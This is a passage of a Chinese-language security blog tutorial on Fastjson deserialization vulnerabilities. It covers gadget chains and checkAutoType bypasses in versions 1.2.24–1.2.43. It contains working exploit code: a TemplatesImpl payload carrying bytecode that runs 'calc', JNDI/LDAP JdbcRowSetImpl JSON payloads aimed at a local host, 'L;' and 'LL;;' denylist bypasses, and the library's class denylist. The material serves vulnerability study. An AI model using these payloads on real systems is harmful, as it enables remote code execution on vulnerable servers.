JavaBeanDeserializer#deserialze(DefaultJSONParser, Type, Object, Object, int)</span><br><span class="line">*   *   *-&gt; JavaBeanDeserializer#parseField(DefaultJSONParser, String, Object, Type, Map&lt;String, Object&gt;)</span><br><span class="line">*   *   *   *-&gt; JavaBeanDeserializer#smartMatch(String) # 字段名不一致，去除-_等符号再比对</span><br><span class="line">*   *   *   *-&gt; DefaultFieldDeserializer#parseField(DefaultJSONParser, Object, Type, Map&lt;String, Object&gt;)</span><br><span class="line">*   *   *   *   FieldDeserializer#setValue(Object, Object) # 调用 setter/getter 方法</span><br><span class="line">*   *   *-&gt; FieldDeserializer#setValue(Object, Object) # 调用 setter/getter 方法</span><br><span class="line">*-&gt; JSON#toJSON(Object)</span><br><span class="line">*   JSON#toJSON(Object, SerializeConfig)</span><br><span class="line">*   JavaBeanSerializer#getFieldValuesMap(Object)</span><br><span class="line">*   FieldSerializer#getPropertyValue(Object)</span><br><span class="line">*   FieldInfo#get(Object) # 调用 getter 方法</span><br></pre></td></tr></table></figure>
+
+<p>其他的反序列化调用方式也大差不差。</p>
+<h3 id="特性总结"><a href="#特性总结" class="headerlink" title="特性总结"></a>特性总结</h3><p>这里直接引用素十八师傅的总结（<a target="_blank" rel="noopener" href="https://www.javasec.org/java-vuls/FastJson.html"><strong>1.4.8.</strong> Fastjson 反序列化漏洞</a>）：</p>
+<ul>
+<li>使用 <code>JSON.parse(jsonString)</code> 和 <code>JSON.parseObject(jsonString, Target.class)</code>，两者调用链一致，前者会在 jsonString 中解析字符串获取 <code>@type</code> 指定的类，后者则会直接使用参数中的 class 。</li>
+<li>fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter&#x2F;setter 方法，其中 getter 方法需满足条件：方法名长于 4、不是静态方法、以 <code>get</code> 开头且第 4 位是大写字母、方法不能有参数传入、继承自 <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code>、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 <code>set</code> 开头且第 4 位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。具体逻辑在 <code>com.alibaba.fastjson.util.JavaBeanInfo.build()</code> 中。</li>
+<li>使用 <code>JSON.parseObject(jsonString)</code> 将会返回 JSONObject 对象，且类中的所有 getter 与 setter 都被调用。</li>
+<li>如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 <code>Feature.SupportNonPublicField</code> 参数。</li>
+<li>fastjson 在为类属性寻找 get&#x2F;set 方法时，调用函数 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> 方法，会忽略 <code>_|-</code> 字符串，也就是说哪怕你的字段名叫 <code>_a_g_e_</code>，getter 方法为 <code>getAge()</code>，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 <code>_</code> 和 <code>-</code> 进行组合混淆。</li>
+<li>fastjson 在反序列化时，如果 Field 类型为 <code>byte[]</code>，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。</li>
+</ul>
+<p>这些特性对于分析反序列化漏洞有很大帮助，其中一部分已经在前面的代码分析中证明完成。</p>
+<h2 id="Fastjson-反序列化"><a href="#Fastjson-反序列化" class="headerlink" title="Fastjson 反序列化"></a>Fastjson 反序列化</h2><h3 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson 1.2.24"></a>fastjson 1.2.24</h3><p>影响版本：<code>fastjson &lt;= 1.2.24</code> </p>
+<p>描述：fastjson 默认使用 @type 指定反序列化任意类，攻击者可以通过在 Java 常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的 getter&#x2F;setter 方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。此漏洞开启了 fastjson 反序列化漏洞的大门，为安全研究人员提供了新的思路。</p>
+<h4 id="TemplatesImpl-利用链"><a href="#TemplatesImpl-利用链" class="headerlink" title="TemplatesImpl 利用链"></a>TemplatesImpl 利用链</h4><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 实现了 Serializable 接口，它可以被序列化。</p>
+<p>具体来看 TemplatesImpl#getTransletInstance() 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240910102017246.png">
+
+<p>这是一个 getter 方法，但是不满足调用要求，它的返回类型是 Translet 。</p>
+<p>再往上找，newTransformer() 方法调用了 getTransletInstance() ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240910102529191.png">
+
+<p>getOutputProperties() 方法又调用了 newTransformer() ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240910102649046.png">
+
+<p>getOutputProperties() 方法是成员属性 _outputProperties 的 getter 方法，它的返回类型是 Properties ，Properties 实现了 Map 接口，符合要求，反序列化时可以调用。</p>
+<p>不过美中不足的是 _outputProperties 属性是私有的，而且没有 setter 方法，所以要用 Feature.SupportNonPublicField 参数才能给它赋值。</p>
+<p>有关 TemplatesImpl 链的一些细节我已经在 CC3 的文章中分析清楚了，总结一下调用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line">TemplatesImpl#newTransformer()</span><br><span class="line">TemplatesImpl#getTransletInstance()</span><br><span class="line"> -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">    TransletClassLoader#defineClass() # 将 _class、_transletIndex 赋值</span><br><span class="line"> -&gt; Class#newInstance() # 初始化时执行静态代码块</span><br></pre></td></tr></table></figure>
+
+<p>下面直接给出测试用例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class TemplateImplTest &#123;</span><br><span class="line">    public static void main(String args[]) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\FastjsonTest\\target\\classes\\pojo\\Eval.class&quot;));</span><br><span class="line">            String base64Code = Base64.getEncoder().encodeToString(code);</span><br><span class="line">            String text1 = &quot;&#123;\n&quot; +</span><br><span class="line">                    &quot;    \&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot; +</span><br><span class="line">                    &quot;    \&quot;_bytecodes\&quot;: [\&quot;&quot; + base64Code + &quot;\&quot;],\n&quot; +</span><br><span class="line">                    &quot;    \&quot;_name\&quot;: \&quot;miaoji\&quot;,\n&quot; +</span><br><span class="line">                    &quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot; +</span><br><span class="line">                    &quot;    \&quot;_outputProperties\&quot;: &#123;&#125;,\n&quot; +</span><br><span class="line">                    &quot;&#125;&quot;;</span><br><span class="line">            System.out.println(text1);</span><br><span class="line"></span><br><span class="line">            JSON.parseObject(text1, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">            // JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我为 _bytecodes 传入的是一个 base64 编码的字节码，如果 JSON 中包含 Base64 编码的字符串，并且将它反序列化为 byte[] 类型的字段时，Fastjson 会自动尝试将该 Base64 字符串转换为字节数组。其中对应的解码操作在 JSONScanner#bytesValue() 中：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240912145741928.png">
+
+<p>调用堆栈如下：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240912150115001.png">
+
+<p>Eval.class 是 Eval 类编译后生成的字节码文件，Eval 类内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">package pojo;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Eval extends AbstractTranslet &#123;</span><br><span class="line">    public Eval() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException var1) &#123;</span><br><span class="line">            throw new RuntimeException(var1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="JdbcRowSetImpl-利用链"><a href="#JdbcRowSetImpl-利用链" class="headerlink" title="JdbcRowSetImpl 利用链"></a>JdbcRowSetImpl 利用链</h4><p>com.sun.rowset.JdbcRowSetImpl 这条利用链是由于 javax.naming.InitialContext#lookup() 参数可控导致的 JNDI 注入。</p>
+<p>setAutoCommit，这是一个 setter 方法，调用了 connect 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240912164123277.png">
+
+<p>跟进 connect 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240912164248222.png">
+
+<p>这里会调用 lookup 方法进行 Jndi 远程调用。</p>
+<p>getDataSourceName()：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240912164342219.png">
+
+<p>所以只需要将 dataSource 设置成 JNDI 服务端地址就行。</p>
+<p>调用链如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl#setAutoCommit(boolean)</span><br><span class="line">JdbcRowSetImpl#connect()</span><br><span class="line">InitialContext#lookup(String)</span><br></pre></td></tr></table></figure>
+
+<p>测试用例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line">public class JdbcRowSetImplTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String json = &quot;&#123;\n&quot; +</span><br><span class="line">                &quot;    \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot; +</span><br><span class="line">                &quot;    \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:10389/Command\&quot;,\n&quot; +</span><br><span class="line">                &quot;    \&quot;autoCommit\&quot;:true\n&quot; +</span><br><span class="line">                &quot;&#125;&quot;;</span><br><span class="line">        JSONObject jsonObject = JSON.parseObject(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="fastjson-1-2-25"><a href="#fastjson-1-2-25" class="headerlink" title="fastjson 1.2.25"></a>fastjson 1.2.25</h3><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.42</code></p>
+<p>fastjson 1.2.25 引入了 checkAutoType 安全机制，采用黑白名单校验类是否可加载。默认情况下 autoTypeSupport 关闭，基于白名单实现安全机制，而打开 autoTypeSupport 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。</p>
+<h4 id="checkAutoType-安全机制"><a href="#checkAutoType-安全机制" class="headerlink" title="checkAutoType 安全机制"></a>checkAutoType 安全机制</h4><p>将依赖版本升级到 1.2.25 之后，再运行上面的 TemplatesImpl 链，会报错：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240912170012708.png">
+
+<p>根据报错信息找到了 ParserConfig#checkAutoType(String, Class&lt;?&gt;)，在看这个方法之前，先说一下 ParserConfig 新增的一些属性：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240912170354428.png">
+
+<p>autoTypeSupport 是新增的一个标志位，denyList 是黑名单，acceptList 是白名单。</p>
+<p>黑名单中包含如下类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread,java.net.Socket</span><br><span class="line">java.rmi,javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>
+
+<p>接着来看 ParserConfig#checkAutoType(String, Class&lt;?&gt;)，这个方法最主要的是几个 if 判断，反复使用黑白名单来验证。</p>
+<p><code>$</code> 替换为 <code>.</code>，处理嵌套类；如果 autoTypeSupport 为 true ，那么先用白名单检查，再用黑名单检查，白名单检查通过的话可以直接加载类，而黑名单不会：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913103434968.png">
+
+<p>运行上面的 TemplateImplTest 代码时，这里的 expectClass 初始值为 null 。</p>
+<p>如果 autoTypeSupport 为 false 的话，则先检查黑名单，再检查白名单。同样的是黑名单检查通过后也不能加载类：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913104958868.png">
+
+<p>如果上面的检查都通过了但是没有加载类的话，再检查一次 autoTypeSupport 是否为 true ，如果是就加载类。这是这个方法中最后一次加载类的地方了，也就是说如果 autoTypeSupport 为 false 的话，是不会加载任何类的。而 autoTypeSupport 默认为 false ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913105414488.png">
+
+<p>最后会检查加载的类是否是 ClassLoader 或 DataSource 的子类，这里是不允许加载它们的：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913105723942.png">
+
+<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>在上面加载类的时候会调用 TypeUtils.loadClass 方法，跟进看一下：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913110524125.png">
+
+<p>这其中的处理逻辑是这样的：</p>
+<p>如果 classname 以 <code>[</code> 开头，就去掉第一个字符 <code>[</code> ，然后返回对应的数组类。这是因为在 Java 中，数组类型的类与普通类不同，它们有独特的类名表示方式。对于一维数组，类名以 <code>[</code> 开头，例如 <code>int[]</code> 对应的类名是 <code>[I</code>，对象数组如 <code>String[]</code> 对应的类名是 <code>[Ljava.lang.String;</code>。这里的代码就是处理这种数组类型的加载。</p>
+<p>如果 className 以 <code>L</code> 开头并以 <code>;</code> 结尾，那么去掉头尾再加载。在字节码和序列化中，对象类型可能会被表示为 <code>L类名;</code> 的形式。例如 <code>java.lang.String</code> 可能被表示为 <code>Ljava/lang/String;</code>。本来是用于处理这种格式的类名，这样看来倒算是一种逻辑漏洞了。</p>
+<p>这里先利用第二种机制，只需要在类名开头加上 <code>L</code> ，结尾加上 <code>;</code> 就可以了。</p>
+<p>payload 如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:10389/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>此外需要将 autoTypeSupport 设置为 true ，有两种办法。</p>
+<p>第一种是全局设置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true)</span><br></pre></td></tr></table></figure>
+
+<p>第二种是为指定的类设置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().addAccept(&quot;com.example.YourClass&quot;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson 1.2.42"></a>fastjson 1.2.42</h3><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.42</code> </p>
+<p>依然是关注 ParserConfig 这个类，主要有两个方面的改动，第一个就是黑名单采用 hash 的方式来表示类，不再是之前的明文了：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913113517522.png">
+
+<p>似乎是 FNV-1a 哈希算法（Fowler-Noll-Vo 哈希算法）的一种变体。hash 算法是不可逆的，无法还原出明文，但是可以通过 jackson 中的黑名单来撞库呢。</p>
+<p>另一方面就是针对 checkAutoType 的改动，在做其他处理之前，首先针对以 <code>L</code> 开头并以 <code>;</code> 结尾的 className 做了处理，去掉了开头和结尾：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913132424499.png">
+
+<p>这里也是采用了 hash 的方式进行了判断，虽然无法从代码直接看出想过滤什么字符，但是结合上个版本的问题也能猜出来。</p>
+<p>此外，在原本判断黑白名单的地方也用 hash 的方式做了改动。作者这么做，想必是为了展示他深厚的功底，可以把相同的事物用不同的方式表达出来吧？</p>
+<p>绕过方式也很容易想到，就是双写开头的 <code>L</code> 和结尾的 <code>;</code> 。</p>
+<p>payload：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:10389/Command8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson 1.2.43"></a>fastjson 1.2.43</h3><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.43</code> </p>
+<p>改动依然是在 ParserConfig#checkAutoType(String, Class&lt;?&gt;, int) ，如果开头出现了连续两个 L ，那么会抛出异常：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240913133657546.png">
+
+<p>这样双写绕过的方式就失效了。不过前面提到了 TypeUtils.loadClass 方法有两种处理机制，现在来研究一下第一种，就是类名前加个 <code>[</code> ，那么我给出一个测试用例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td 